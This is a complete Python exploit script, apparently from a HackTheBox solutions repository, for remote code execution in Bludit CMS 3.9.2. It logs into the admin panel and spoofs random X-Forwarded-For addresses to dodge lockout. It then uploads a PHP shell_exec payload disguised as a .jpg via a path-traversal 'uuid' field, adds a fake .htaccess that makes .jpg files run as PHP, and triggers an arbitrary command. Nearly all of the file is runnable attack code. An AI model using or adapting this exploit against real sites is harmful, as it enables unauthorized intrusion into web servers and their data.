#!/usr/bin/env python3

# author: mind2hex
# github: https://github.com/mind2hex/hackthebox.git

import argparse
from base64 import b64decode
from http import client
from re import search as research
from random import randint,choices

def banner():
    print(b64decode(b"CiAgIC5fX19fX19fX19fX19fX19fXy4gICBibHVkaXQgdjMuOS4yICBSZW1vdGUgQ29kZSBFeGVjdXRpb24KICAgfC4tLS0tLS0tLS0tLS0tLS0ufCAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgIHx8c25kY21kKHdob2FtaSkgfHwgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgIHx8cmN2PmJsdWRpdCAgICAgfHwgICAgICAgICAgICAgICAgICAgICAgLi0tLS0uICAKICAgfHwgICAgICAgICAgICAgICB8fCAgICAgICAgICAuLS0tLS0tLS0tLiB8ID09IHwgIyBtaW5kMmhleAogICB8fCAgICAgICAgICAgICAgIHx8ICAgICAgICAgIHwuLSIiIiIiLS58IHwtLS0tfCAKICAgfHwgICAgICAgICAgICAgICB8fCAgICAgICAgICB8fHdob2FtaSB8fCB8ID09IHwKICAgfHxfX19fX19fX19fX19fX198fCAgICAgICAgICB8fD5ibHVkaXR8fCB8LS0tLXwKICAgLy4tLi0uLS4tLi0uLS4tLi0uXCAgICAgICAgICB8Jy0uLi4uLi0nfCB8Ojo6OnwKICAvLi0uLS4tLi0uLS4tLi0uLS4tLlwgICAgICAgICBgIiIpLS0tKCIiYCB8X19fLnwKIC8uLS4tLi0uLS4tLi0uLS4tLi0uLS5cICAgICAgIC86Ojo6Ojo6Ojo6OlwiIF8gICIKL19fX19fXy9fX19fX19fX19fXF9fX29fXCAgICAgLzo6Oj09PT09PT06OjpcYFxgXApcX19fX19fX19fX19fX19fX19fX19fX18vICAgICBgIiIiIiIiIiIiIiIiImAgICctJwoKIyBXYXJuaW5nOiBUaGlzIHNjcmlwdCBtYXliZSBjYW4ndCBkZWxldGUgdGhlIGV2aWwgaW1nIGFuZCBmYWtlIC5odGFjY2VzcwojICAgICAgICAgIHRoYXQgZGVwZW5kcyBvZiB0aGUgZHN0IGJsdWRpdCB0bXAgZmlsZSBwZXJtaXNzaW9uLgo=").decode())
    
def argument_parser():
    parser = argparse.ArgumentParser(prog="bludit_3.9.2-RCE.py",usage="./bludit_3.9.2-RCE.py")
    parser.add_argument("--host",type=str,required=True,help="Specify host to connect Ex:[google.com]")
    parser.add_argument("--path",default="/bludit/",type=str,help="Specify webserv bludit page (Not login page) path Ex:[/bludit/]")
    parser.add_argument("--port",default=80,type=int,help="Specify web server port DEFAULT:80")
    parser.add_argument("-u","--usr",default="admin",type=str,required=True,help="Specify username",metavar="usr")
    parser.add_argument("-p","--psw",default="admin",type=str,required=True,help="Specify password",metavar="psw")
    parser.add_argument("-c","--command",type=str,required=True,help="Specify command to execute",metavar="cmd")
    args = parser.parse_args()

    return parser.parse_args()

def argument_checker(args):
    HTTPHandler = client.HTTPConnection(args.host, args.port)
    HTTPHandler.connect()
    cookie,token = argument_checker_host(HTTPHandler, args.host, args.path)
    token = argument_checker_credentials(HTTPHandler, args.host, args.path, cookie, token, args.usr, args.psw)
    args.badjpg = upload_image(HTTPHandler, args.path, args.host, cookie, token, args.command)
    upload_htaccess(HTTPHandler, args.path, args.host, cookie, token)
    command_execution(HTTPHandler, args.badjpg, args.path)

def argument_checker_host(HTTPHandler, host, path):
    """ 
    Initialize HTTPHandler, check host conectivity and
    check if bludit is running on the web server
    
    returns HTTPHandler,BLUDIT-KEY,Token
    """
    header = {
        "Host":host,
        "User-Agent":"GoogleBot",
        "Connection":"KeepAlive"
        }
    HTTPHandler.request("GET",path.rstrip("/") + "/admin/",headers=header)
    # Checking host conectivity
    try:
        response = HTTPHandler.getresponse()
    except:
        ERROR("argument_checker_host","host seems down")
    # Checking token and cookie existence
    try:
        token = research('input.+?name="tokenCSRF".+?value="(.+?)"', response.read().decode()).group(1)
        cookie = response.getheader("Set-Cookie").split(";")[0]
    except:
        ERROR("argument_checker_host","bludit cookie and token doesn't found")
        
    print("[*] Page Cookie: ",cookie)
    print("[*] Login page Token: ",token)        
    return cookie,token

def argument_checker_credentials(HTTPHandler, host, path, cookie, token, username, password):
    """ Try to login using credentials and returns log in token"""
    bodydata = "tokenCSRF={}&username={}&password={}&save=".format(token,username,password)
    header = {
        "Host":host,
        "User-Agent":"GoogleBot",
        "X-Forwarded-For":"{}.{}.{}.{}".format(randint(10,255),randint(10,255),randint(10,255),randint(10,255)),
        "Connection":"close",
        "Content-Type":"application/x-www-form-urlencoded",
        "Content-Length":len(bodydata),
        "DNT":"1",
        "Cookie":cookie
        }
    HTTPHandler.request("POST",path.rstrip("/") + "/admin/",body=bodydata,headers=header)
    # Checking host conectivity again
    try:
        response = HTTPHandler.getresponse()
    except:
        ERROR("argument_checker_credentials","unable to send POST request")
    if response.getheader("Location") == None:
        ERROR("argument_checker_credentials","invalid credentials")
    else:
        header = {
            "Host":host,
            "User-Agent":"GoogleBot",
            "Connection":"close",
            "DNT":"1",
            "Cookie":cookie
            }
        HTTPHandler.request("GET",response.getheader("Location"),headers=header)
        response = HTTPHandler.getresponse()
        token = research('var tokenCSRF = "(.+?)"',response.read().decode()).group(1)

    print("[*] dashboard page token: ",token)        
    return token

def upload_image(HTTPHandler, path, host, cookie, token, command):
    boundary = "".join(choices("abcdef0123456789",k=20))
    badjpg = ("".join(choices("abcdef0123456789",k=6))) + ".jpg"
    print("[*] Uploading malicious image: {}".format(badjpg))    
    bodydata = """--{}
Content-Disposition: form-data; name="uuid"

../../tmp
--{}
Content-Disposition: form-data; name="tokenCSRF"

{}
--{}
Content-Disposition: form-data; name="images[]"; filename="{}"
Content-Type: application/octet-stream

<?php shell_exec("rm .htaccess ; rm {} ; {}");?>
--{}--

""".format(boundary, boundary, token, boundary, badjpg, badjpg, command, boundary)
    header = {
        "HOST":host,
        "User-Agent":"GoogleBot",
        "Accept-Encoding": "gzip, deflate",
        "Accept":"*/*",
        "Origin":"http://192.168.0.20/bludit",
        "X-Requested-With":"XMLHttpRequest",
        "Referer":"http://192.168.0.20/bludit/admin/new-content",
        "Connection":"close",
        "Cookie":"{}; {}".format(cookie,cookie),
        "Content-Length":len(bodydata),
        "Content-Type":"multipart/form-data; boundary={}".format(boundary)
        }
    HTTPHandler.request("POST",path.rstrip("/") + "/admin/ajax/upload-images",body=bodydata,headers=header)
    try:
        response = HTTPHandler.getresponse()
    except:
        ERROR("upload_image","unable to upload malicious image")

    return badjpg

def upload_htaccess(HTTPHandler, path, host, cookie, token):
    print("[*] Uploading fake .htaccess ")
    boundary = "".join(choices("abcdef0123456789",k=20))
    bodydata = """--{}
Content-Disposition: form-data; name="uuid"

../../tmp
--{}
Content-Disposition: form-data; name="tokenCSRF"

{}
--{}
Content-Disposition: form-data; name="images[]"; filename=".htaccess"

RewriteEngine off
AddType application/x-httpd-php .jpg
--{}--
""".format(boundary, boundary, token, boundary, boundary)
    header = {
        "HOST":host,
        "User-Agent":"GoogleBot",
        "Accept-Encoding": "gzip, deflate",
        "Accept":"*/*",
        "Origin":"http://192.168.0.20/bludit",
        "X-Requested-With":"XMLHttpRequest",
        "Referer":"http://192.168.0.20/bludit/admin/new-content",
        "Connection":"close",
        "Cookie":"{}; {}".format(cookie,cookie),
        "Content-Length":len(bodydata),
        "Content-Type":"multipart/form-data; boundary={}".format(boundary)
    }
    HTTPHandler.request("POST",path.rstrip("/") + "/admin/ajax/upload-images",body=bodydata,headers=header)
    try:
        response = HTTPHandler.getresponse()
    except:
        print("[X] unable to upload .htaccess")
        exit()

def command_execution(HTTPHandler, eviljpg, path):
    print("[*] Executing command ")
    HTTPHandler.request("GET",path.rstrip("/") + "/bl-content/tmp/{}".format(eviljpg))
        

def ERROR(msg1,msg2):
    """ 
    msg1 = location
    msg2 = reason
    """
    print("==================")
    print("#### ERROR #######")
    print("[X] {}".format(msg1))
    print("[X] {}".format(msg2))
    print("==================")
    exit()    

if __name__ == "__main__":
    banner()
    args = argument_parser()
    argument_checker(args)
    print("[*] Done... Have fun")
